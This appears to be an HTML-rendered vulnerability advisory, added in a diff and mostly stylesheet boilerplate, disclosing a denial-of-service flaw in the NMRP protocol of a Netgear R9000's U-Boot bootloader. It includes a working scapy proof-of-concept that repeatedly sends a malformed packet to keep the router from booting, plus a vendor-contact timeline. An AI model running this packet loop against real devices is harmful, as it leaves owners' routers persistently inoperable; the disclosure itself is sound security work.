@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>0045-nmrp-advisory.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="denial-of-service-in-nmrp-protocol">Denial of Service in NMRP Protocol</h1>
+<p>Published: April 1, 2021</p>
+<p>CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H [6.5]</p>
+<h1 id="prior-art">Prior Art</h1>
+<p><a href="http://www.chubb.wattle.id.au/PeterChubb/nmrp.html">http://www.chubb.wattle.id.au/PeterChubb/nmrp.html</a></p>
+<p><a href="https://github.com/jclehner/nmrpflash">https://github.com/jclehner/nmrpflash</a></p>
+<h2 id="overview">Overview</h2>
+<p>The NMRP protocol is a debug feature used to update firmware images on Netgear Routers over the LAN.  This protocol does not require authentication.  NMRP is a Layer 2 protocol based on Ethernet.  The NMRP daemon starts for three seconds before the U-Boot bootloader begins the boot process of the primary Linux operating system. This is evident by checking the <code>bootcmd</code> environment variable within U-Boot:</p>
+<pre class="hljs"><code><div>ALPINE_DB&gt; printenv bootcmd
+bootcmd=nmrp;run check_dni_image;run bootargsnand;qca8337_init_one; ledtoggle;sleep 1;run bootnand
+</div></code></pre>
+<p>This is the version of U-Boot testing was completed against as output from the U-Boot bootloader:</p>
+<pre class="hljs"><code><div>U-Boot 2015.01-gd836bbb (Jul 22 2016 - 13:32:00)
+</div></code></pre>
+<p>The specific device used for testing was a Netgear Nighthawk R9000 (x10) router.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Multiple memory corruption issues exist within the NMRP protocol implementation within U-Boot. Any of these vulnerabilities can be exploited to cause the bootloader to hang and no longer accept input from either the network or the primary UART console.  The only option is to cut the power in order to restart the device. This results in preventing the operating system from loading and thus the device being operable.  An attacker with a wired LAN connection can repeatedly emit these malicious packets so that every time the device attempts to boot, the vulnerability is triggered and the device doesn't boot into Linux.  The end result is an attacker on the wired LAN can prevent the router from ever achieving an operational state.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>A python-based proof of concept script is provided to demonstrate the vulnerability. You will need the <code>scapy</code> package installed in order to run this script.  <code>scapy</code> can be installed with pip: <code>pip3 install scapy</code>. Additionally, the script will need to be run with root privileges in order to send layer 2 packets.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> time
+
+SRC_MAC_ADDRESS = <span class="hljs-string">"dc:a6:32:1b:1d:c6"</span>
+DST_MAC_ADDRESS = <span class="hljs-string">"cc:40:d0:5d:a2:84"</span>
+
+pkt = Ether(src=SRC_MAC_ADDRESS, dst=DST_MAC_ADDRESS, type=<span class="hljs-number">0x912</span>) / <span class="hljs-string">b'\x00\x00\x01\x00\x00\x0e\x00\x01\x00\x00NTGR\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+  sendp(pkt, iface=<span class="hljs-string">'eth0'</span>) <span class="hljs-comment"># change iface to match ethernet NIC connected to router.</span>
+  time.sleep(<span class="hljs-number">0.95</span>)
+</div></code></pre>
+<p>This vulnerability works by setting the options length to <code>0x0000</code> for the initial advertisement packet that is sent to initiate the firmware upload process. Note that you will need to change the <code>SRC_MAC_ADDRESS</code> and <code>DST_MAC_ADDRESS</code> variables to match your lab configuration, and you may need to change the value for <code>iface</code> in the <code>sendp</code> invocation to match your ethernet adapter which is connected to the router. The ethernet connection must be on the first ethernet port on the router.</p>
+<h2 id="extrapolation">Extrapolation</h2>
+<p>During testing, many different packets were crafted and sent to the device.  Some crafted packets resulted in an error message and subsequent device reload. The aforementioned proof of concept is not the only packet which results in a device hang; there were too many combinations to list individually in this write up.  It is recommended that the vendor review the source code for the NMRP protocol and conduct an internal audit for additional memory corruption issues.</p>
+<h2 id="time-line">Time Line</h2>
+<ul>
+<li>January 31st, 2021: Notified Vendor of Vulnerability - stated intent to disclose April 1st, 2020.</li>
+<li>February 07, 2021: No response, sent reminder email asking for acknowledgement.</li>
+<li>February 15, 2021: No response, sent another reminder email asking for acknowledgement.</li>
+<li>February 21, 2021: No response, sent another reminder email asking for acknowledgement.</li>
+<li>February 21, 201: Tweeted @NETGEAR to attempt contact. <a href="https://twitter.com/nstarke/status/1363552292729946113">https://twitter.com/nstarke/status/1363552292729946113</a></li>
+<li>March 21, 2021: No response, sent another reminder email asking for acknowledgement.</li>
+<li>March 21, 2021: Tweeted @NETGEAR again to attempt contact. <a href="https://twitter.com/nstarke/status/1373701891801104385">https://twitter.com/nstarke/status/1373701891801104385</a></li>
+<li>March 24, 2021: Received tweet from @NETGEAR_UKI directing me to their bug bounty program. <a href="https://twitter.com/NETGEAR_UKI/status/1374834049483599872">https://twitter.com/NETGEAR_UKI/status/1374834049483599872</a></li>
+<li>March 24, 2021: Responded saying I cannot disclose through the bug bounty program.  <a href="https://twitter.com/nstarke/status/1374834668177096705">https://twitter.com/nstarke/status/1374834668177096705</a></li>
+<li>April 1, 2021: Public Disclosure</li>
+</ul>
+
+</body>
+</html>
